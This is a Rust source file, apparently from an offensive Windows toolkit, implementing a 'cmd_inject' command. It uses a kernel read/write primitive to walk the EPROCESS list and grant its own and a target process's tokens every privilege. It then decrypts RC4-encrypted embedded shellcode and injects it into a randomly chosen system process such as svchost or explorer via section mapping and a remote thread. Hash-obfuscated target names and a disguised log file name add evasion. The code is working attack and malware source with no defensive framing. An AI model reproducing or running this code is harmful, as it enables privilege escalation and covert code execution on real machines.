use anyhow::{bail, Context, Result};
use std::ffi::c_void;
use std::ptr::null_mut;

use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, GetCurrentProcessId, OpenProcess,
};

use crate::device::Device;
use crate::eprocess::{
    read_image_filename, EPROC_ACTIVE_LINKS, EPROC_TOKEN, EPROC_UNIQUE_PID,
    TOKEN_SEP_ENABLED, TOKEN_SEP_PRESENT,
};
use crate::kernel_rw::KernelRW;
use crate::utils::{find_export_va, find_mod, get_kernel_modules, ntoskrnl_disk_path};

const PROCESS_ALL_ACCESS:     u32 = 0x001F_FFFF;
const THREAD_ALL_ACCESS:      u32 = 0x001F_03FF;
const PAGE_READWRITE:         u32 = 0x0000_0004;
const PAGE_EXECUTE_READ:      u32 = 0x0000_0020;
const PAGE_EXECUTE_READWRITE: u32 = 0x0000_0040;
const SEC_COMMIT:             u32 = 0x0800_0000;
const SECTION_ALL_ACCESS:     u32 = 0x000F_001F;

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtCreateSection(
        section_handle:          *mut *mut c_void,
        desired_access:          u32,
        object_attributes:       *mut c_void,
        maximum_size:            *mut i64,
        section_page_protection: u32,
        allocation_attributes:   u32,
        file_handle:             *mut c_void,
    ) -> i32;

    fn NtMapViewOfSection(
        section_handle:      *mut c_void,
        process_handle:      *mut c_void,
        base_address:        *mut *mut c_void,
        zero_bits:           usize,
        commit_size:         usize,
        section_offset:      *mut i64,
        view_size:           *mut usize,
        inherit_disposition: u32,
        allocation_type:     u32,
        win32_protect:       u32,
    ) -> i32;

    fn NtUnmapViewOfSection(
        process_handle: *mut c_void,
        base_address:   *mut c_void,
    ) -> i32;

    fn NtCreateThreadEx(
        thread_handle:      *mut *mut c_void,
        desired_access:     u32,
        object_attributes:  *mut c_void,
        process_handle:     *mut c_void,
        start_routine:      *mut c_void,
        argument:           *mut c_void,
        create_flags:       u32,
        zero_bits:          usize,
        stack_size:         usize,
        maximum_stack_size: usize,
        attribute_list:     *mut c_void,
    ) -> i32;
}

const RC4_KEY: &[u8] = br#"-4S@aAv;&T~2\.e+3])N`C|"\.3FTVH8NG5O$Hjh+~s^g'G06ni"n{E2cujo"w^lnmZo)i!I6U:i}k~(xy,ftS~v%"FTq)<@V%8uG?P@))V%@xOHovWgtA5n/.vj1C+W3G7K=<2ZX'{Q&Y80Ql{?tS}SwzR.MKrz1<gKCV$"t=OP<8N$<jQ'=Lt(HPI\*u4yZ(~v_pY3{TDFlb^^Y`Tlac3mPRbHlZNh{Y% o{y`q[r5fQOv$}`Q?oLvX,YWp+~,"#;

include!(concat!(env!("OUT_DIR"), "/shellcode.rs"));

fn rc4(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut s: [u8; 256] = core::array::from_fn(|i| i as u8);
    let mut j = 0usize;
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }
    let (mut i, mut j) = (0usize, 0usize);
    data.iter().map(|&b| {
        i = (i + 1) % 256;
        j = (j + s[i] as usize) % 256;
        s.swap(i, j);
        b ^ s[(s[i] as usize + s[j] as usize) % 256]
    }).collect()
}

const fn fnv1a(s: &[u8]) -> u32 {
    let mut h: u32 = 0x811c9dc5;
    let mut i = 0;
    while i < s.len() {
        let c = if s[i] >= b'A' && s[i] <= b'Z' { s[i] + 32 } else { s[i] };
        h ^= c as u32;
        h = h.wrapping_mul(0x01000193);
        i += 1;
    }
    h
}

const WLIST: &[u32] = &[
    fnv1a(b"svchost.exe"),
    fnv1a(b"explorer.exe"),
    fnv1a(b"runtimebroker.exe"),
    fnv1a(b"dllhost.exe"),
    fnv1a(b"spoolsv.exe"),
    fnv1a(b"sihost.exe"),
    fnv1a(b"taskhostw.exe"),
    fnv1a(b"ctfmon.exe"),
];

fn is_whitelisted(name: &str) -> bool {
    let h = fnv1a(name.as_bytes());
    WLIST.contains(&h)
}

struct WalkResult {
    our_eproc:    u64,
    candidates:   Vec<(u64, u64)>,
    target_eproc: Option<u64>,
}

fn walk_eprocess(
    krw:        &KernelRW,
    system_eproc: u64,
    our_pid:    u64,
    target_pid: Option<u64>,
) -> Result<WalkResult> {
    let mut our_eproc: Option<u64> = None;
    let mut candidates: Vec<(u64, u64)> = Vec::new();
    let mut target_eproc: Option<u64> = None;

    let mut current = system_eproc;
    let mut iterations = 0usize;

    loop {
        iterations += 1;
        if iterations > 5000 { bail!("EPROCESS walk exceeded 5000 iterations"); }
        if current < 0xFFFF_8000_0000_0000 { bail!("invalid EPROCESS 0x{:016X}", current); }

        let pid = krw.kread(current + EPROC_UNIQUE_PID)?;

        if pid == our_pid {
            our_eproc = Some(current);
        }

        match target_pid {
            Some(tpid) => {
                if pid == tpid { target_eproc = Some(current); }
            }
            None => {
                if pid != our_pid {
                    let name = read_image_filename(krw, current)?;
                    if is_whitelisted(&name) {
                        candidates.push((pid, current));
                    }
                }
            }
        }

        let flink = krw.kread(current + EPROC_ACTIVE_LINKS)?;
        if flink < 0xFFFF_8000_0000_0000 { bail!("invalid flink 0x{:016X}", flink); }
        let next = flink.wrapping_sub(EPROC_ACTIVE_LINKS);
        if next == system_eproc || next == 0 { break; }
        current = next;
    }

    Ok(WalkResult {
        our_eproc:    our_eproc.context("own PID not found in EPROCESS list")?,
        candidates,
        target_eproc,
    })
}

fn escalate_eproc(krw: &KernelRW, eproc: u64) -> Result<()> {
    let token_ref = krw.kread(eproc + EPROC_TOKEN)?;
    let token = token_ref & !0xF;
    krw.kwrite(token + TOKEN_SEP_PRESENT, 0xFFFF_FFFF_FFFF_FFFF)?;
    krw.kwrite(token + TOKEN_SEP_ENABLED, 0xFFFF_FFFF_FFFF_FFFF)?;
    Ok(())
}

fn log_debug(msg: &str) {
    use std::io::Write;
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open("C:\\Windows\\Temp\\mmdevlib_kernel.log") {
        let _ = writeln!(f, "[cmd_inject] {}", msg);
        let _ = f.sync_all();
    }
}

pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
    log_debug("cmd_inject started");
    if SHELLCODE_ENC.is_empty() {
        bail!("no sc_enc.bin");
    }

    let shellcode = rc4(RC4_KEY, SHELLCODE_ENC);
    log_debug(&format!("shellcode decrypted: {} bytes", shellcode.len()));

    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe   = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let krw  = KernelRW::setup(dev, &pe, nt.va)?;

    let ps_init_va   = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    let system_eproc = krw.kread(ps_init_va)?;
    if system_eproc < 0xFFFF_8000_0000_0000 {
        bail!("PsInitialSystemProcess kread bad value 0x{:016X}", system_eproc);
    }
    log_debug(&format!("PsInitialSystemProcess = 0x{:016X}", system_eproc));

    let our_pid = unsafe { GetCurrentProcessId() } as u64;
    log_debug(&format!("Walking EPROCESS, our PID={}, target_pid={:?}", our_pid, target_pid));
    let walk    = walk_eprocess(&krw, system_eproc, our_pid, target_pid)?;
    log_debug(&format!("walk_eprocess done. our_eproc=0x{:016X}, target_eproc={:?}, candidates={}", 
        walk.our_eproc, walk.target_eproc, walk.candidates.len()));

    let (final_pid, target_eproc) = match target_pid {
        Some(pid) => {
            let ep = walk.target_eproc
                .with_context(|| format!("PID {} not found", pid))?;
            (pid, ep)
        }
        None => {
            let candidates = &walk.candidates;
            if candidates.is_empty() {
                bail!("no whitelisted target process found");
            }
            let idx = unsafe { core::arch::x86_64::_rdtsc() } as usize % candidates.len();
            candidates[idx]
        }
    };
    log_debug(&format!("Selected target process for injection: PID={}", final_pid));

    log_debug("Escalating privileges...");
    escalate_eproc(&krw, walk.our_eproc)?;
    log_debug("Privileges escalated successfully.");

    let hproc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, final_pid as u32) };
    if hproc.is_null() {
        bail!("OpenProcess PID={} WinErr={}", final_pid, unsafe { GetLastError() });
    }
    log_debug(&format!("Opened target process handle: {:?}", hproc));

    let mut sec_size = shellcode.len() as i64;
    let mut hsec: *mut c_void = null_mut();
    log_debug("Calling NtCreateSection...");
    let st = unsafe {
        NtCreateSection(
            &mut hsec,
            SECTION_ALL_ACCESS,
            null_mut(),
            &mut sec_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        )
    };
    if st != 0 { bail!("NtCreateSection failed: {st:x}"); }
    log_debug(&format!("NtCreateSection success: handle {:?}", hsec));

    let mut local_view: *mut c_void = null_mut();
    let mut local_size = 0usize;
    let st = unsafe {
        NtMapViewOfSection(
            hsec, GetCurrentProcess(),
            &mut local_view, 0, 0, null_mut(), &mut local_size,
            2, 0, PAGE_READWRITE,
        )
    };
    if st != 0 { bail!("NtMapViewOfSection(local) failed: {st:x}"); }
    log_debug(&format!("Mapped local view at {:?}", local_view));

    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view as *mut u8, shellcode.len());
    }
    log_debug("Copied shellcode into local view.");

    let mut remote_view: *mut c_void = null_mut();
    let mut remote_size = 0usize;
    let st = unsafe {
        NtMapViewOfSection(
            hsec, hproc,
            &mut remote_view, 0, 0, null_mut(), &mut remote_size,
            2, 0, PAGE_EXECUTE_READ,
        )
    };
    if st != 0 { bail!("NtMapViewOfSection(remote) failed: {st:x}"); }
    log_debug(&format!("Mapped remote view at {:?}", remote_view));

    unsafe { NtUnmapViewOfSection(GetCurrentProcess(), local_view); }
    unsafe { CloseHandle(hsec); }
    log_debug("Unmapped local view and closed section handle.");

    let mut hthread: *mut c_void = null_mut();
    log_debug("Calling NtCreateThreadEx...");
    let st = unsafe {
        NtCreateThreadEx(
            &mut hthread, THREAD_ALL_ACCESS, null_mut(),
            hproc, remote_view, null_mut(),
            0, 0, 0, 0, null_mut(),
        )
    };
    if st != 0 { bail!("NtCreateThreadEx failed: {st:x}"); }
    log_debug(&format!("NtCreateThreadEx success: thread handle {:?}", hthread));

    escalate_eproc(&krw, target_eproc)?;
    println!("[+] PID {} is God", final_pid);

    unsafe { CloseHandle(hthread); }
    unsafe { CloseHandle(hproc); }

    log_debug("cmd_inject finished successfully!");
    Ok(())
}
